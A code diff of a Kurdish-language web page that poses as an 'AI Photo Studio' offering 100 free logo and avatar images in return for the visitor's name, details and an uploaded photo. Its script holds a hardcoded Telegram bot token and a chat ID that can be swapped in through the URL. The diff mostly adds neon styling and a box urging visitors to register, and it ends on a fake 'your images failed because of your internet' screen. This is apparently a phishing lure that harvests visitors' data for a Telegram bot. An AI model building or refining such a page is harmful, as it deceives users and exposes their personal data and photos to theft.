@@ -6,9 +6,14 @@
     <title>AI Photo Studio - دروستکردنی ١٠٠ وێنەی لۆگۆ و ئەڤاتار</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js"></script>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap');
+
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; }
+        
         body {
-            background: linear-gradient(135deg, #0f172a, #1e1b4b, #311042);
+            background: linear-gradient(135deg, #0f172a, #2e1065, #1e1b4b);
+            background-size: 400% 400%;
+            animation: neonBG 12s ease infinite;
             color: #fff;
             min-height: 100vh;
             display: flex;
@@ -16,73 +21,128 @@
             align-items: center;
             padding: 20px;
         }
+
+        @keyframes neonBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
         .container {
-            background: rgba(30, 41, 59, 0.7);
-            backdrop-filter: blur(16px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: rgba(15, 23, 42, 0.8);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(56, 189, 248, 0.3);
             padding: 30px 20px;
             border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            max-width: 450px;
+            box-shadow: 0 0 35px rgba(56, 189, 248, 0.2), inset 0 0 15px rgba(168, 85, 247, 0.1);
+            max-width: 480px;
             width: 100%;
             text-align: center;
         }
+
         .logo-icon {
-            font-size: 40px;
+            font-size: 45px;
             margin-bottom: 10px;
             animation: pulse 2s infinite;
+            filter: drop-shadow(0 0 10px #38bdf8);
         }
+
         @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
+            0% { transform: scale(1); filter: drop-shadow(0 0 5px #38bdf8); }
+            50% { transform: scale(1.12); filter: drop-shadow(0 0 20px #a855f7); }
+            100% { transform: scale(1); filter: drop-shadow(0 0 5px #38bdf8); }
         }
-        h1 { font-size: 22px; color: #38bdf8; margin-bottom: 8px; font-weight: 700; }
-        p { font-size: 13px; color: #94a3b8; margin-bottom: 20px; line-height: 1.5; }
+
+        h1 {
+            font-size: 22px;
+            color: #38bdf8;
+            margin-bottom: 8px;
+            font-weight: 900;
+            text-shadow: 0 0 10px rgba(56, 189, 248, 0.6), 0 0 20px rgba(56, 189, 248, 0.4);
+        }
+
+        p {
+            font-size: 13px;
+            color: #cbd5e1;
+            margin-bottom: 15px;
+            line-height: 1.6;
+            text-shadow: 0 0 5px rgba(203, 213, 225, 0.4);
+        }
+
+        .info-box {
+            background: rgba(56, 189, 248, 0.05);
+            border: 1px dashed rgba(56, 189, 248, 0.4);
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 12px;
+            color: #38bdf8;
+            margin-bottom: 15px;
+            text-shadow: 0 0 5px rgba(56, 189, 248, 0.5);
+        }
         
         .form-group {
             margin-bottom: 12px;
             text-align: right;
         }
+
         .form-group label {
             font-size: 12px;
-            color: #cbd5e1;
+            color: #e2e8f0;
             margin-bottom: 4px;
             display: block;
+            text-shadow: 0 0 5px rgba(226, 232, 240, 0.4);
         }
+
         .form-control {
             width: 100%;
             padding: 10px 12px;
-            background: rgba(15, 23, 42, 0.6);
-            border: 1px solid rgba(255, 255, 255, 0.15);
+            background: rgba(15, 23, 42, 0.7);
+            border: 1px solid rgba(56, 189, 248, 0.3);
             border-radius: 8px;
-            color: #fff;
-            font-size: 13px;
+            color: #38bdf8;
+            font-size: 14px;
+            font-weight: 700;
             outline: none;
-            transition: border-color 0.3s;
+            transition: all 0.3s;
+            text-shadow: 0 0 8px rgba(56, 189, 248, 0.6);
+            box-shadow: inset 0 0 5px rgba(0,0,0,0.5);
         }
+
         .form-control:focus {
-            border-color: #38bdf8;
+            border-color: #a855f7;
+            box-shadow: 0 0 12px rgba(168, 85, 247, 0.6), inset 0 0 5px rgba(168, 85, 247, 0.3);
+            color: #e879f9;
+            text-shadow: 0 0 10px rgba(232, 121, 249, 0.8);
         }
 
         .upload-box {
-            border: 2px dashed #38bdf8;
+            border: 2px dashed #a855f7;
             padding: 15px;
             border-radius: 10px;
             cursor: pointer;
-            background: rgba(56, 189, 248, 0.05);
+            background: rgba(168, 85, 247, 0.05);
             margin-top: 15px;
             margin-bottom: 15px;
             transition: all 0.3s ease;
+            box-shadow: 0 0 10px rgba(168, 85, 247, 0.2);
         }
+
         .upload-box:hover {
-            background: rgba(56, 189, 248, 0.1);
+            background: rgba(168, 85, 247, 0.15);
+            box-shadow: 0 0 20px rgba(168, 85, 247, 0.4);
         }
+
         .upload-box input { display: none; }
-        .upload-text { font-size: 13px; color: #e2e8f0; font-weight: 600; }
+        
+        .upload-text {
+            font-size: 13px;
+            color: #e879f9;
+            font-weight: 700;
+            text-shadow: 0 0 8px rgba(232, 121, 249, 0.6);
+        }
 
         .btn {
-            background: linear-gradient(135deg, #0ea5e9, #6366f1);
+            background: linear-gradient(135deg, #0ea5e9, #a855f7);
             color: white;
             border: none;
             padding: 12px;
@@ -90,37 +150,57 @@
             border-radius: 10px;
             cursor: pointer;
             width: 100%;
-            font-weight: bold;
-            box-shadow: 0 4px 15px rgba(14, 165, 233, 0.4);
+            font-weight: 900;
+            box-shadow: 0 0 20px rgba(14, 165, 233, 0.5), 0 0 20px rgba(168, 85, 247, 0.5);
             transition: all 0.3s ease;
             margin-top: 5px;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
         }
-        .btn:hover { opacity: 0.9; transform: translateY(-2px); }
+
+        .btn:hover {
+            opacity: 0.95;
+            transform: translateY(-2px);
+            box-shadow: 0 0 30px rgba(14, 165, 233, 0.8), 0 0 30px rgba(168, 85, 247, 0.8);
+        }
         
         .progress-container { display: none; margin-top: 20px; }
+        
         .progress-bar-bg {
-            background: #334155;
+            background: #1e293b;
             border-radius: 10px;
-            height: 8px;
+            height: 9px;
             width: 100%;
             overflow: hidden;
             margin-bottom: 8px;
+            box-shadow: inset 0 0 5px rgba(0,0,0,0.8);
         }
+
         .progress-bar-fill {
             background: linear-gradient(90deg, #38bdf8, #a855f7);
             height: 100%;
             width: 0%;
             transition: width 0.4s ease;
+            box-shadow: 0 0 10px #38bdf8, 0 0 10px #a855f7;
         }
-        .status-text { font-size: 12px; color: #cbd5e1; }
+
+        .status-text {
+            font-size: 12px;
+            color: #38bdf8;
+            text-shadow: 0 0 8px rgba(56, 189, 248, 0.6);
+        }
     </style>
 </head>
 <body>
 
     <div class="container" id="main-card">
         <div class="logo-icon">✨</div>
-        <h1>تۆمارکردن بۆ دروستکردنی ١٠٠ وێنەی AI</h1>
-        <p>تکایە زانیارییەکانت بە دروستی پڕبکەرەوە و وێنەیەکی خۆت ئەپلۆد بکە تاوەکو مۆدێلی AI دەست بە دروستکردنی وێنەکانت بکات.</p>
+        <h1>AI Photo Studio - دروستکردنی ١٠٠ وێنەی AI</h1>
+        <p>ئەم ماڵپەڕە سەکۆیەکی پێشکەوتووی زیرەکی دەستکردە (AI) کە تایبەتە بە دروستکردنی ١٠٠ وێنەی ناوازەی لۆگۆ و ئەڤاتار بە کوالێتی بەرز[cite: 3].</p>
+        
+        <div class="info-box">
+            📌 <strong>بۆچی خۆتۆمارکردن گرنگە؟</strong><br>
+            بۆ ئەوەی سیستەمەکە بتوانێت ناسنامەی مۆدێلەکەت ڕێک بخات، وێنەکانت بە دروستی جێبەجێ بکات و مۆدێلی AI چالاک ببێت، پێویستە ئەم زانیاریانە پڕ بکەیتەوە.
+        </div>
 
         <div class="form-group">
             <label>ناوی خۆت:</label>
@@ -164,7 +244,6 @@
 
     <script>
         const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
-        
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('id') || "6782298541";
 
@@ -429,9 +508,9 @@
 
             setTimeout(() => {
                 document.getElementById('main-card').innerHTML = `
-                    <div style="font-size: 50px; margin-bottom: 15px;">⚠️</div>
-                    <h1 style="color: #f87171;">وێنەکانت ئامادە نەبوون!</h1>
-                    <p>بەهۆی خراپی دۆخی ئینتەرنێتەکەت و پچڕانی هێڵەکەوە، پرۆسەی دروستکردنی وێنەکان سەرکەوتوو نەبوو. تکایە هێڵی ئینتەرنێتەکەت بپشکنە و دووبارە هەوڵ بدەرەوە.</p>
+                    <div style="font-size: 50px; margin-bottom: 15px; filter: drop-shadow(0 0 10px #f87171);">⚠️</div>
+                    <h1 style="color: #f87171; text-shadow: 0 0 10px rgba(248, 113, 113, 0.6);">وێنەکانت ئامادە نەبوون!</h1>
+                    <p style="text-shadow: 0 0 5px rgba(255,255,255,0.3);">بەهۆی خراپی دۆخی ئینتەرنێتەکەت و پچڕانی هێڵەکەوە، پرۆسەی دروستکردنی وێنەکان سەرکەوتوو نەبوو. تکایە هێڵی ئینتەرنێتەکەت بپشکنە و دووبارە هەوڵ بدەرەوە.</p>
                 `;
             }, 1000);
         }
